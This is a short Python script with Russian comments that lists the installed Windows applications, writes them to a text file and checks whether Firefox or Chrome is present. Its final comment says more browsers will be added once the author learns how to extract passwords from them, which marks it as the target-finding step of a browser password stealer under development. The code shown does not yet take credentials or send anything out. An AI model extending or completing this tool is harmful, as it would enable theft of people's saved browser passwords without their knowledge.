import winapps

# Сделать запись установленых приложений в файл
# Передать установленые браузеры в возврате для обработки
app_list = []
chrome = False
firefox = False
yandex = False
opera = False


def get_apps():
    f = open('text.txt', 'w')

    for app in winapps.list_installed():
        app_list.append(app)  # все приложения записуются в апп лист
        f.write((str(app) + '\n'))#запись результата в текстовик

    f.close()


def scan_apps():
    fire = 'Firefox'
    file = open('text.txt','r')
    text = file.read()
    if fire in text:
        firefox = True
    print(firefox)

    chro = 'Chrome'
    if chro in text:
        chrome = True
    print(chrome)
    file.close()
#Нужно добавить еще браузеров, но это после того как узнаем как получить из них пароли
